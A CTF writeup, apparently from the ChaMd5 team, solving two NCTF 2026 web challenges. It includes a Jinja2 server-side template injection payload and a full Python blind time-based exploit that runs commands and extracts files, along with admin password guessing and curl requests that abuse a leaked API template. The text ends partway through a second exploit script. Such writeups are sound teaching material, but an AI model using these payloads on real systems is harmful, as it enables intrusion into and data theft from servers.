---
title: 2026NCTF Writeup by Mini-Venom
url: https://mp.weixin.qq.com/s/1Kx56eUL4FcomcEPVfP3rA
source: Doonsec's feed
date: 2026-04-07
fetch_date: 2026-04-08T04:33:35.255095
---

# 2026NCTF Writeup by Mini-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/jvwqHfehg2Pic6vJuxibDjHxiavhu8DWWVMadL0y3KWIkxZ1z8qibj9b9uzSkSib7OFo3chKaahza4hMiafTT7SsQ2j7F1wHKibkV1vNERMJwoCiczU/0?wx_fmt=jpeg)

# 2026NCTF Writeup by Mini-Venom

原创

Mini-Venom
Mini-Venom

ChaMd5安全团队

![]()

在小说阅读器中沉浸阅读

> 招新小广告CTF组诚招web、re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

## Web

**N-Horse**

打ssti盲注

```
GET /?username={{cycler.__init__.__globals__.os.popen('sleep 5').read()}}&password=1
```

Exp:

```
#!/usr/bin/env python3
import argparse
import string
import sys
import time

import requests

DEFAULT_CHARSET = "{}_-" + string.ascii_letters + string.digits
DEFAULT_CANDIDATE_PATHS = [
    "/flag",
    "/flag.txt",
    "/app/flag",
    "/app/flag.txt",
    "/tmp/flag",
    "/home/ctf/flag",
    "/home/ctf/flag.txt",
]

class BlindSSTIExploit:
    def __init__(self, base_url, delay, timeout, charset, proxy=None):
        self.base_url = base_url.rstrip("/") + "/"
        self.delay = delay
        self.timeout = timeout
        self.charset = charset
        self.session = requests.Session()
        if proxy:
            self.session.proxies.update({"http": proxy, "https": proxy})

    @staticmethod
    def build_payload(command):
        escaped = command.replace("\\", "\\\\").replace("'", "\\'")
        return"{{cycler.__init__.__globals__.os.popen('%s').read()}}" % escaped

    def request_time(self, payload):
        start = time.time()
        try:
            self.session.get(
                self.base_url,
                params={"username": payload, "password": "1"},
                timeout=self.timeout,
            )
        except requests.RequestException:
            pass
        return time.time() - start

    def oracle(self, command, threshold=None):
        payload = self.build_payload(command)
        elapsed = self.request_time(payload)
        limit = threshold if threshold isnotNoneelse (self.delay - 0.5)
        return elapsed > limit, elapsed

    def confirm_rce(self):
        ok, elapsed = self.oracle(f"sleep {self.delay}")
        return ok, elapsed

    def find_flag_path(self, paths):
        for path in paths:
            ok, elapsed = self.oracle(f"test -f {path} && sleep {self.delay}")
            print(f"[path] {path:<24} hit={ok} time={elapsed:.2f}s")
            if ok:
                return path
        returnNone

    def get_length(self, path, max_len):
        for size in range(1, max_len + 1):
            ok, elapsed = self.oracle(
                f"[ $(wc -c < {path}) -eq {size} ] && sleep {self.delay}"
            )
            if ok:
                print(f"[len] {size} time={elapsed:.2f}s")
                return size
        returnNone

    def extract_char(self, path, position):
        for ch in self.charset:
            ok, elapsed = self.oracle(
                f"[ \"$(cut -c{position} {path})\" = '{ch}' ] && sleep {self.delay}"
            )
            if ok:
                print(f"[chr] pos={position:<2} char={ch!r} time={elapsed:.2f}s")
                return ch
        returnNone

    def extract_value(self, path, length):
        value = []
        for position in range(1, length + 1):
            ch = self.extract_char(path, position)
            if ch isNone:
                print(f"[!] failed at position {position}", file=sys.stderr)
                break
            value.append(ch)
            print(f"[cur] {''.join(value)}")
        return"".join(value)

def parse_args():
    parser = argparse.ArgumentParser(
        description="Blind Jinja2 SSTI exploit for the N-Horse challenge."
    )
    parser.add_argument(
        "-u",
        "--url",
        default="http://114.66.24.221:32571/",
        help="Target base URL.",
    )
    parser.add_argument(
        "-d",
        "--delay",
        type=int,
        default=3,
        help="Sleep delay used by the time-based oracle.",
    )
    parser.add_argument(
        "-t",
        "--timeout",
        type=int,
        default=8,
        help="HTTP request timeout.",
    )
    parser.add_argument(
        "-m",
        "--max-len",
        type=int,
        default=80,
        help="Maximum flag length to probe.",
    )
    parser.add_argument(
        "-c",
        "--charset",
        default=DEFAULT_CHARSET,
        help="Character set for blind extraction.",
    )
    parser.add_argument(
        "-p",
        "--paths",
        nargs="*",
        default=DEFAULT_CANDIDATE_PATHS,
        help="Candidate flag paths.",
    )
    parser.add_argument(
        "--proxy",
        help="Optional proxy URL, for example http://127.0.0.1:8080",
    )
    return parser.parse_args()

def main():
    args = parse_args()
    exploit = BlindSSTIExploit(
        base_url=args.url,
        delay=args.delay,
        timeout=args.timeout,
        charset=args.charset,
        proxy=args.proxy,
    )

    ok, elapsed = exploit.confirm_rce()
    print(f"[rce] confirmed={ok} time={elapsed:.2f}s")
    ifnot ok:
        print("[!] RCE confirmation failed", file=sys.stderr)
        sys.exit(1)

    flag_path = exploit.find_flag_path(args.paths)
    ifnot flag_path:
        print("[!] no candidate flag path matched", file=sys.stderr)
        sys.exit(1)
    print(f"[+] flag path: {flag_path}")

    length = exploit.get_length(flag_path, args.max_len)
    ifnot length:
        print("[!] failed to determine flag length", file=sys.stderr)
        sys.exit(1)

    flag = exploit.extract_value(flag_path, length)
    print(f"[+] final flag: {flag}")

if __name__ == "__main__":
    main()
#python exp.py -u url
```

### N-RustPICA

首页是一个典型 SPA，真正数据靠前端 JS 再去请求 API。

js源码里泄露了很多接口

![](https://mmbiz.qpic.cn/mmbiz_png/jvwqHfehg2PZ4DlDJCc5nDouKcTPAlc1INKqoGpuz3hr7pSoxVlN3DTQEhLxRKC6t3yYfd80j4VAib7bZMHZbhsIztnFfyONkrnEHQ0PsUVw/640?wx_fmt=png&from=appmsg)

这一步说明两件事：

1. 后台确实存在，不是纯前端假页面
2. 有一个旧流程模板接口 /api/admin/templates/review-flow

登录

默认用户名已经给了：anime\_admin

然后针对 anime\_admin 试少量强相关密码：

* anime\_admin
* admin
* 123456
* purestream
* 站点/品牌名变体

关键命中是：

* 用户名：anime\_admin
* 密码：purestream

登录后台，找到隐藏条目

拿着 Cookie 访问后台列表：

```
curl -b "nctf_admin_session=27506416-d601-4954-a5b1-be02eb9e1fd7" \
  http://114.66.24.221:32833/api/admin/anime
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jvwqHfehg2PQiarM5Elhlp9LG2zVSoDIN9AYsB5lYIyCibB6yztLGCEHu2hrJbadeEYQAVj6VNNzGGFgalRDzQs8N6x8snyrQOttUd4mgoIj4/640?wx_fmt=png&from=appmsg)

返回里可以看到一条公开页面没有的内部条目：

```
{
  "id":"anime-0007",
  "name":"内部审片 07",
  "status":"internal"
}
```

```
curl -b "nctf_admin_session=27506416-d601-4954-a5b1-be02eb9e1fd7" \
  http://114.66.24.221:32833/api/admin/anime/anime-0007
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jvwqHfehg2Pesm2cMsibhTskiaPpTGPB2NI7IflzCz2iaAZosVRpOcpN1KHxXsP03P1MZzAl0TzzVUBcK4jDItre2vf1IrEibNcibMZibH1l2wSYg/640?wx_fmt=png&from=appmsg)

旧流程模板接口：

```
curl -b "nctf_admin_session=27506416-d601-4954-a5b1-be02eb9e1fd7" \
  http://114.66.24.221:32833/api/admin/templates/review-flow
```

![](https://mmbiz.qpic.cn/mmbiz_png/jvwqHfehg2NNHadp2FQSueBsIuF1oMLMySVLgIRpsrmBB4qqYqtFHGiaNicIt7yOq8Pr7m8ticqQuNrxKuy4axVYVK4y4395TiaPAJ2vGicx0tRg/640?wx_fmt=png&from=appmsg)

这说明：

1. 后台仍然支持旧审核流程
2. 发布内部条目需要完整 JSON
3. 字段名、大小写、值格式都已经被泄露

直接拿模板去打状态迁移接口：

```
curl -b "nctf_admin_session=27506416-d601-4954-a5b1-be02eb9e1fd7" \
  -H "Content-Type: application/json" \
  -X POST \
  -d "{\"action\":\"publish\",\"targetStatus\":\"published\",\"reviewerToken\":\"FEATURE-REVIEW-2025\",\"featured\":false,\"approvalTicket\":\"PENDING-APPROVAL\"}" \
  http://114.66.24.221:32833/api/admin/anime/anime-0007/transition
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/jvwqHfehg2MNaicoDKV38zzYm5jnYdTpLsUIQYt7V2uG4sia4ytib7n4Q6VdekYrecVRuia9WlgqiaJZGELf7UJESpjRpcmESudCBLXM2icJhiapZk/640?wx_fmt=png&from=appmsg)

exp

```
import requests

BASE = "http://114.66.24.221:32833"
USERNAME = "anime_admin"
PASSWORD = "purestream"
TARGET_ID = "anime-0007"

s = requests.Session()

def login():
    r = s.post(
        f"{BASE}/api/auth/log...